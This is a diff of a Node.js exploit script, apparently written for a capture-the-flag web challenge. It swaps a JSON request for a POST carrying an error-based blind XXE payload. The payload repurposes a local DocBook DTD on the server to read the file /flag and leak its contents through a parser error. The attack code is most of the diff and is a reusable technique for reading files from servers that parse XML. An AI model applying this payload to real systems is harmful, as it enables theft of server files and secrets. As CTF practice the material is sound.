@@ -17,38 +17,43 @@ function AjaxFormPost(message) {
   }
 
   for (i = 0; i < message.length; i++) {
+    //console.log(message[i] + " has charcode " + message[i].charCodeAt(0));
     message_new += blindmap[(message[i].charCodeAt(0))];
   }
 
   console.log("Searching " + message + " with " + message_new);
-  datasend = JSON.stringify({
-    'message': message_new,
-  });
-  var url = 'https://bnv.web.ctfcompetition.com/api/search';
-  var XMLHttpRequest = require("xmlhttprequest").XMLHttpRequest;
-  var xhr = new XMLHttpRequest();
-  xhr.open('POST', url, true);
-  xhr.setRequestHeader('Content-type', 'application/json');
+  const fetch = require("node-fetch");
+  fetch("https://bnv.web.ctfcompetition.com/api/search", {
+  "headers": {
+    "content-type": "text/xml",
+    "charset": "utf-8",
+  },
+  "referrer": "https://bnv.web.ctfcompetition.com/",
+  "referrerPolicy": "no-referrer-when-downgrade",
+  "body": `<!DOCTYPE message [
+<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
+<!ENTITY % ISOamso '
+<!ENTITY &#x25; file SYSTEM "file:///flag">
+<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
+&#x25;eval;
+&#x25;error;
+'>
+%local_dtd;
+]>
+<message>`+message_new+`</message>`,
+  "method": "POST",
+  "mode": "cors",
+  "credentials": "omit"
+})
+  .then( response => response.text() )
+  .then( json => console.log(json) )
+  .catch( error => console.error('error:', error) );
 
-  xhr.onreadystatechange =
-      function() {
-    if (xhr.readyState == 4 && xhr.status == 200) {
-        console.log(xhr.getResponseHeader('Content-Type'));
-        if (xhr.getResponseHeader('Content-Type') == "application/json; charset=utf-8") {
-            try {
-                var json = JSON.parse(xhr.responseText);
-                console.log(json);
-            }
-            catch(e) {;
-                console.log(message);
-            }
-        }
-        else {
-            console(xhr.responseText);
-        }
-    }
-}
-      xhr.send(datasend);
+
+
 }
 
 AjaxFormPost("paris");
+
+
+
